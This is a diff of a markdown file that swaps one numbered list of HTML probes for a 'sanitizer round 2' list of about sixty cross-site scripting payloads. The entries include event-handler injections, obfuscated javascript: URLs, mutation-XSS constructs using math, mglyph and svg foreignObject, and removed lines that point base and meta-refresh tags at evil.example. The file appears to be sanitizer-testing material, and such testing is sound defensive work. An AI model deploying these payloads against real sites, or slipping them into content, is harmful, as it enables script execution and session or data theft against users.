@@ -1,158 +1,242 @@
-# ct probe
+# sanitizer round 2
 
-**p1**
+**q1**
 
-<script>alert(1)</script>
+<math><mtext><img src=x onerror=alert(1)></mtext></math>
 
-**p2**
+**q2**
 
-<img src=x onerror=alert(1)>
+<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>
 
-**p3**
+**q3**
 
-<svg onload=alert(1)>
+<svg><foreignObject width=100 height=100><details open ontoggle=alert(1)>x</details></foreignObject></svg>
 
-**p4**
+**q4**
 
-<svg><script>alert(1)</script></svg>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></mglyph></table></mtext></math>
 
-**p5**
+**q5**
 
-<iframe src="javascript:alert(1)"></iframe>
+<svg><desc><script>alert(1)</script></desc></svg>
 
-**p6**
+**q6**
 
-<a href="javascript:alert(1)">x</a>
+<math><semantics><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></semantics></math>
 
-**p7**
-
-<a href="jav&#x09;ascript:alert(1)">x</a>
-
-**p8**
-
-[x](javascript:alert(1))
-
-**p9**
-
-[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
-
-**p10**
-
-<math><mtext><script>alert(1)</script></mtext></math>
-
-**p11**
-
-<div style="background:url(javascript:alert(1))">x</div>
-
-**p12**
-
-<img src=x:alert(1) onerror=eval(src)>
-
-**p13**
+**q7**
 
 <details open ontoggle=alert(1)>x</details>
 
-**p14**
+**q8**
+
+<svg><use xlink:href="javascript:alert(1)"/></svg>
+
+**q9**
+
+<template><img src=x onerror=alert(1)></template>
+
+**q10**
+
+<img src=x onerror=alert(1)>
+
+**q11**
 
 <video><source onerror=alert(1)></video>
 
-**p15**
+**q12**
 
-<object data="javascript:alert(1)"></object>
+<picture><source onerror=alert(1)></picture>
 
-**p16**
+**q13**
 
-<form action="javascript:alert(1)"><input type=submit></form>
+<svg><animate href="javascript:alert(1)" attributeName="href" dur="1s"/></svg>
 
-**p17**
+**q14**
 
-<base href="//evil.example">
+<svg><set attributeName=href to=javascript:alert(1)></svg>
 
-**p18**
+**q15**
 
-<meta http-equiv="refresh" content="0;url=//evil.example">
+<input onfocus=alert(1) autofocus>
 
-**p19**
-
-<style>@import '//evil.example/x.css'</style>
-
-**p20**
-
-<svg><animate onbegin=alert(1) attributeName=x dur=1s>
-
-**p21**
-
-<svg><set attributeName=onmouseover to=alert(1)>
-
-**p22**
-
-<img src="x" srcset="y" onerror=alert(1)>
-
-**p23**
-
-<a href="&#106;avascript:alert(1)">x</a>
-
-**p24**
-
-<table background="javascript:alert(1)"><tr><td>x</td></tr></table>
-
-**p25**
-
-<input autofocus onfocus=alert(1)>
-
-**p26**
-
-<select autofocus onfocus=alert(1)><option>x</option></select>
-
-**p27**
+**q16**
 
 <marquee onstart=alert(1)>x</marquee>
 
-**p28**
+**q17**
 
-<template><script>alert(1)</script></template>
+<applet codebase=javascript:alert(1)></applet>
 
-**p29**
+**q18**
 
-<isindex action=javascript:alert(1) type=image>
+<bgsound src=javascript:alert(1)>
 
-**p30**
+**q19**
 
-<a href="//evil.example" target="_blank">x</a>
+<img src=x onerror=alert(1) onerror=alert(1)>
 
-**p31**
+**q20**
 
-<image src=x onerror=alert(1)>
+<img src=x onerror=`alert(1)>`>
 
-**p32**
+**q21**
+
+<a href="java&#x09;cript:alert(1)">click</a>
+
+**q22**
+
+<a href="java&#115;cript:alert(1)">click</a>
+
+**q23**
+
+<a href="javascript&#58;alert(1)">click</a>
+
+**q24**
+
+<a href="javascript&colon;alert(1)">click</a>
+
+**q25**
+
+<a href="java\nscript:alert(1)">click</a>
+
+**q26**
+
+<a href="jav\tascript:alert(1)">click</a>
+
+**q27**
+
+<a href=javascript:alert(1)>"click</a>
+
+**q28**
+
+<a href=JaVaScRiPt:alert(1)>click</a>
+
+**q29**
+
+<iframe src="javascript:alert(1)">
+
+**q30**
+
+<iframe srcdoc="<img src=x onerror=alert(1)>">
+
+**q31**
+
+<noscript><img src=x onerror=alert(1)></noscript>
+
+**q32**
 
 <svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
 
-**p33**
+**q33**
 
-<math><a href="javascript:alert(1)">x</a></math>
+<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
 
-**p34**
+**q34**
 
-<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+<form action=javascript:alert(1)><button>submit</button></form>
 
-**p35**
+**q35**
 
-<a href="data:text/html,<script>alert(1)</script>">x</a>
+<object data="javascript:alert(1)">
 
-**p36**
+**q36**
 
-<abbr title="&quot;&gt;&lt;img src=x onerror=alert(1)&gt;">x</abbr>
+<embed src="javascript:alert(1)">
 
-**p37**
+**q37**
 
-<pre><code>&lt;img src=x onerror=alert(1)&gt;</code></pre>
+<meta http-equiv=refresh content=0;url=javascript:alert(1)>
 
-**p38**
+**q38**
 
-<del datetime="javascript:alert(1)">x</del>
+<div style="background:url(javascript:alert(1))">x</div>
 
-**p39**
+**q39**
 
-<ins cite="javascript:alert(1)">x</ins>
+<img src=x o:onerror=alert(1)>
+
+**q40**
+
+<div id=x onmouseover=alert(1)>hover</div>
+
+**q41**
+
+<select onchange=alert(1)><option>x</option></select>
+
+**q42**
+
+<option onchange=alert(1) selected>x</option>
+
+**q43**
+
+<ul><li onmouseover=alert(1)>x</li></ul>
+
+**q44**
+
+<table background="javascript:alert(1)">x</table>
+
+**q45**
+
+<img src=x onerror=alert(1)>
+
+**q46**
+
+<a href=" vbscript:msgbox(1)">click</a>
+
+**q47**
+
+<link rel=stylesheet href="javascript:alert(1)">
+
+**q48**
+
+<base href="javascript:alert(1)//"><a href=x>click</a>
+
+**q49**
+
+<svg><foreignObject><style><!--</style><img src=x onerror=alert(1)>--></foreignObject></svg>
+
+**q50**
+
+<math><mrow><mi><script>alert(1)</script></mi></mrow></math>
+
+**q51**
+
+<details open ontoggle=javascript:alert(1)>x</details>
+
+**q52**
+
+<img src=x onerror=javascript:alert(1)>
+
+**q53**
+
+<svg><foreignObject><details open ontoggle=alert(1)>x</details></foreignObject></svg>
+
+**q54**
+
+<a href="javascript&tab;alert(1)">click</a>
+
+**q55**
+
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></mglyph></table></mtext></math>
+
+**q56**
+
+<svg><foreignObject><style></style><img src=x onerror=alert(1)></foreignObject></svg>
+
+**q57**
+
+<template><details open ontoggle=alert(1)>x</details></template>
+
+**q58**
+
+<math><annotation-xml encoding="application/xhtml+xml"><img src=x onerror=alert(1)></annotation-xml></math>
+
+**q59**
+
+<iframe srcdoc="<svg onload=alert(1)>"></iframe>
+
+**q60**
+
+<form action="javascript&#x3a;alert(1)"><input type=submit></form>
 
